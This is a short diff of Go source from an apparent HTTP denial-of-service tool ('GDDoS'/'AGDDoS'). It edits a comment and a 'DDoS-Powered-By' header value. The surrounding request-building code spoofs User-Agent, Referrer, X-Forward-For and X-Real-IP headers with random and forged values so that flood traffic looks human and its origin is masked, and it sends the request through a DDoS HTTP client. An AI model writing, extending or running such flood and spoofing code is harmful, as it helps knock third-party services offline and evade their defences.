@@ -117,7 +117,7 @@ func DoHttpRequest() (*string, error) {
 	if err != nil {
 		return nil, err
 	}
-	// Make yourself look like a robot
+	// Make yourself don't look like a robot
 	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])                        // 生成伪UA
 	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                                      // 生成伪来源页面的地址
 	request.Header.Set("Accept", "*/*")                                                             // 接受所有
@@ -125,7 +125,7 @@ func DoHttpRequest() (*string, error) {
 	request.Header.Set("Accept-language", "zh-CN,zh;q=0.9")                                         // 接受网页语言
 	request.Header.Set("X-Forward-For", "186.240.156.78,1.4.0.1,1.5.127.254,1.5.26.6,"+genIpaddr()) // 多 层 代 理
 	request.Header.Set("X-Real-IP", "186.240.156.78")                                               // 多 层 代 理
-	request.Header.Set("DDoS-Powered-By", "GDDoS")                                                  // 低 调 的 调 戏
+	request.Header.Set("DDoS-Powered-By", "AGDDoS")                                                 // 低 调 的 调 戏
 
 	response, err := DDosHttpClient.Do(request)
 	if err != nil {
